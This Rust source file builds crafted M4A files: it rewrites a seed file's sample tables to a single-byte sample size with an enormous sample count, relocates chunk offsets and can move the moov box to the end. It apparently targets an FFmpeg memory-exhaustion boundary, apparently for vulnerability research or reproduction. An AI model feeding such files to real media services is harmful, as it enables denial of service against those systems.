use anyhow::{Context, Result, ensure};
use serde_json::json;

const CONTAINERS: &[[u8; 4]] = &[
    *b"moov", *b"trak", *b"mdia", *b"minf", *b"stbl", *b"edts", *b"dinf", *b"meta",
];

#[derive(Debug, Clone)]
struct Mp4Box {
    start: usize,
    size: usize,
    header_size: usize,
    kind: [u8; 4],
}

impl Mp4Box {
    fn end(&self) -> usize {
        self.start + self.size
    }

    fn payload(&self) -> usize {
        self.start + self.header_size
    }
}

#[derive(Debug, Clone, Copy)]
pub struct M4aOptions {
    pub sample_count: u32,
    pub moov_at_end: bool,
}

fn u32_at(data: &[u8], offset: usize) -> Result<u32> {
    let bytes = data.get(offset..offset + 4).context("truncated MP4 u32")?;
    Ok(u32::from_be_bytes(bytes.try_into().unwrap()))
}

fn u64_at(data: &[u8], offset: usize) -> Result<u64> {
    let bytes = data.get(offset..offset + 8).context("truncated MP4 u64")?;
    Ok(u64::from_be_bytes(bytes.try_into().unwrap()))
}

fn put_u32(data: &mut [u8], offset: usize, value: u32) -> Result<()> {
    let target = data
        .get_mut(offset..offset + 4)
        .context("truncated MP4 u32 destination")?;
    target.copy_from_slice(&value.to_be_bytes());
    Ok(())
}

fn put_u64(data: &mut [u8], offset: usize, value: u64) -> Result<()> {
    let target = data
        .get_mut(offset..offset + 8)
        .context("truncated MP4 u64 destination")?;
    target.copy_from_slice(&value.to_be_bytes());
    Ok(())
}

fn parse_range(data: &[u8], start: usize, end: usize, boxes: &mut Vec<Mp4Box>) -> Result<()> {
    ensure!(start <= end && end <= data.len(), "invalid MP4 range");
    let mut cursor = start;
    while cursor < end {
        ensure!(end - cursor >= 8, "truncated MP4 box header at {cursor:#x}");
        let size32 = u32_at(data, cursor)?;
        let kind: [u8; 4] = data[cursor + 4..cursor + 8].try_into().unwrap();
        let (size, header_size) = match size32 {
            0 => (end - cursor, 8),
            1 => {
                ensure!(end - cursor >= 16, "truncated extended MP4 box header");
                (
                    usize::try_from(u64_at(data, cursor + 8)?).context("MP4 box is too large")?,
                    16,
                )
            }
            value => (usize::try_from(value).unwrap(), 8),
        };
        ensure!(size >= header_size, "invalid MP4 box size at {cursor:#x}");
        let box_end = cursor.checked_add(size).context("MP4 box end overflow")?;
        ensure!(box_end <= end, "MP4 box extends past its parent");
        let item = Mp4Box {
            start: cursor,
            size,
            header_size,
            kind,
        };
        boxes.push(item.clone());
        if CONTAINERS.contains(&kind) {
            parse_range(data, cursor + header_size, box_end, boxes)?;
        }
        cursor = box_end;
    }
    ensure!(cursor == end, "unparsed MP4 bytes at {cursor:#x}");
    Ok(())
}

fn parse(data: &[u8]) -> Result<Vec<Mp4Box>> {
    let mut boxes = Vec::new();
    parse_range(data, 0, data.len(), &mut boxes)?;
    Ok(boxes)
}

fn only(boxes: &[Mp4Box], kind: [u8; 4]) -> Result<&Mp4Box> {
    let matches: Vec<&Mp4Box> = boxes.iter().filter(|item| item.kind == kind).collect();
    ensure!(
        matches.len() == 1,
        "expected one {:?} box, found {}",
        kind,
        matches.len()
    );
    Ok(matches[0])
}

fn ancestors<'a>(boxes: &'a [Mp4Box], child: &Mp4Box) -> impl Iterator<Item = &'a Mp4Box> {
    boxes
        .iter()
        .filter(|item| item.start < child.start && item.end() >= child.end())
}

fn set_box_size(data: &mut [u8], item: &Mp4Box, size: usize) -> Result<()> {
    if item.header_size == 8 {
        put_u32(
            data,
            item.start,
            u32::try_from(size).context("MP4 box grew beyond 32-bit size")?,
        )?;
    } else {
        put_u64(
            data,
            item.start + 8,
            u64::try_from(size).context("MP4 box is too large")?,
        )?;
    }
    Ok(())
}

fn make_constant_case(seed: &[u8], sample_count: u32) -> Result<(Vec<u8>, usize, usize)> {
    ensure!(sample_count > 0, "sample count must be positive");
    let boxes = parse(seed)?;
    let stsz = only(&boxes, *b"stsz")?.clone();
    let stsc = only(&boxes, *b"stsc")?.clone();
    let stts = only(&boxes, *b"stts")?.clone();
    let stco = only(&boxes, *b"stco")?.clone();
    let mdat = only(&boxes, *b"mdat")?.clone();

    ensure!(
        u32_at(seed, stsc.payload() + 4)? == 1,
        "expected one stsc run"
    );
    ensure!(
        u32_at(seed, stts.payload() + 4)? >= 1,
        "expected at least one stts run"
    );
    ensure!(
        u32_at(seed, stco.payload() + 4)? >= 1,
        "expected at least one stco entry"
    );
    ensure!(
        stco.start < mdat.start,
        "seed is not fast-start: stco follows mdat"
    );

    let old_sample_size = u32_at(seed, stsz.payload() + 4)?;
    let old_count = u32_at(seed, stsz.payload() + 8)?;
    let explicit_bytes = if old_sample_size == 0 {
        let entries_start = stsz.payload() + 12;
        let bytes = stsz.end() - entries_start;
        ensure!(
            bytes == usize::try_from(old_count).unwrap() * 4,
            "stsz table length does not match sample count"
        );
        bytes
    } else {
        0
    };

    let mut output = seed.to_vec();
    put_u32(&mut output, stsz.payload() + 4, 1)?;
    put_u32(&mut output, stsz.payload() + 8, sample_count)?;
    put_u32(&mut output, stsc.payload() + 12, sample_count)?;
    put_u32(&mut output, stts.payload() + 8, sample_count)?;

    let chunk_count = u32_at(seed, stco.payload() + 4)?;
    for index in 0..chunk_count {
        let location = stco.payload() + 8 + usize::try_from(index).unwrap() * 4;
        let old_offset = u32_at(seed, location)?;
        ensure!(
            u64::from(old_offset) >= explicit_bytes as u64,
            "stco offset underflows after stsz compaction"
        );
        put_u32(&mut output, location, old_offset - explicit_bytes as u32)?;
    }

    if explicit_bytes != 0 {
        set_box_size(&mut output, &stsz, stsz.size - explicit_bytes)?;
        for ancestor in ancestors(&boxes, &stsz) {
            set_box_size(&mut output, ancestor, ancestor.size - explicit_bytes)?;
        }
        let entries_start = stsz.payload() + 12;
        output.drain(entries_start..stsz.end());
    }

    let rebuilt = parse(&output)?;
    let rebuilt_stsz = only(&rebuilt, *b"stsz")?;
    ensure!(
        rebuilt_stsz.size == rebuilt_stsz.header_size + 12,
        "constant stsz did not compact to a 20-byte box"
    );
    ensure!(
        u32_at(&output, rebuilt_stsz.payload() + 4)? == 1,
        "constant stsz sample size validation failed"
    );
    ensure!(
        u32_at(&output, rebuilt_stsz.payload() + 8)? == sample_count,
        "constant stsz sample count validation failed"
    );
    let rebuilt_stco = only(&rebuilt, *b"stco")?;
    let rebuilt_mdat = only(&rebuilt, *b"mdat")?;
    for index in 0..u32_at(&output, rebuilt_stco.payload() + 4)? {
        let location = rebuilt_stco.payload() + 8 + usize::try_from(index).unwrap() * 4;
        let offset = u32_at(&output, location)? as usize;
        ensure!(
            offset >= rebuilt_mdat.payload() && offset < rebuilt_mdat.end(),
            "stco no longer points into mdat"
        );
    }
    Ok((output, explicit_bytes, old_count as usize))
}

fn top_level(data: &[u8]) -> Result<Vec<Mp4Box>> {
    let mut boxes = Vec::new();
    let mut cursor = 0;
    while cursor < data.len() {
        let before = boxes.len();
        parse_range(data, cursor, data.len(), &mut boxes)?;
        // parse_range parses the entire suffix, so retain only the first box and
        // continue from its end. This keeps extended and size-zero boxes simple.
        let first = boxes[before].clone();
        boxes.truncate(before + 1);
        cursor = first.end();
    }
    Ok(boxes)
}

fn move_moov_to_end(data: &[u8]) -> Result<Vec<u8>> {
    let boxes = top_level(data)?;
    let moov = boxes
        .iter()
        .find(|item| item.kind == *b"moov")
        .context("M4A has no moov box")?;
    let mdat = boxes
        .iter()
        .find(|item| item.kind == *b"mdat")
        .context("M4A has no mdat box")?;
    if boxes.last().is_some_and(|item| item.kind == *b"moov") {
        return Ok(data.to_vec());
    }

    let old_mdat_payload = mdat.payload() as i128;
    let mut output = Vec::with_capacity(data.len());
    let mut new_mdat_payload = None;
    for item in boxes.iter().filter(|item| item.kind != *b"moov") {
        let start = output.len();
        if item.kind == *b"mdat" {
            new_mdat_payload = Some(start + item.header_size);
        }
        output.extend_from_slice(&data[item.start..item.end()]);
    }
    let moov_start = output.len();
    output.extend_from_slice(&data[moov.start..moov.end()]);
    let new_mdat_payload = new_mdat_payload.context("failed to relocate mdat")?;
    let delta = (new_mdat_payload as i128) - old_mdat_payload;
    let moov_end = output.len();
    if delta != 0 {
        let nested = parse(&output)?;
        for item in nested
            .iter()
            .filter(|item| item.start >= moov_start && item.end() <= moov_end)
        {
            if item.kind == *b"stco" {
                let count = u32_at(&output, item.payload() + 4)?;
                for index in 0..count {
                    let location = item.payload() + 8 + usize::try_from(index).unwrap() * 4;
                    let old = i128::from(u32_at(&output, location)?);
                    let updated = old + delta;
                    ensure!(
                        (0..=i128::from(u32::MAX)).contains(&updated),
                        "stco relocation overflows"
                    );
                    put_u32(&mut output, location, updated as u32)?;
                }
            } else if item.kind == *b"co64" {
                let count = u32_at(&output, item.payload() + 4)?;
                for index in 0..count {
                    let location = item.payload() + 8 + usize::try_from(index).unwrap() * 8;
                    let old = i128::from(u64_at(&output, location)?);
                    let updated = old + delta;
                    ensure!(
                        updated >= 0 && updated <= i128::from(u64::MAX),
                        "co64 relocation overflows"
                    );
                    put_u64(&mut output, location, updated as u64)?;
                }
            }
        }
    }
    let final_boxes = top_level(&output)?;
    ensure!(
        final_boxes.last().is_some_and(|item| item.kind == *b"moov"),
        "moov relocation validation failed"
    );
    Ok(output)
}

pub fn make_candidate(data: &[u8], options: &M4aOptions) -> Result<(Vec<u8>, serde_json::Value)> {
    ensure!(options.sample_count > 0, "sample count must be positive");
    ensure!(
        options.sample_count <= 178_956_970,
        "sample count exceeds the pinned FFmpeg boundary"
    );
    let (mut output, removed_bytes, original_count) =
        make_constant_case(data, options.sample_count)?;
    if options.moov_at_end {
        output = move_moov_to_end(&output)?;
    }
    let projected_index_bytes = u64::from(options.sample_count) * 24;
    let projected_timing_bytes = u64::from(options.sample_count) * 12;
    let details = json!({
        "sample_size": 1,
        "sample_count": options.sample_count,
        "stts_sample_delta": 1024,
        "stsc_samples_per_chunk": options.sample_count,
        "original_sample_count": original_count,
        "removed_explicit_stsz_bytes": removed_bytes,
        "moov_at_end": options.moov_at_end,
        "projected_avindex_bytes": projected_index_bytes,
        "projected_timing_bytes": projected_timing_bytes,
        "projected_table_bytes": projected_index_bytes + projected_timing_bytes,
    });
    Ok((output, details))
}
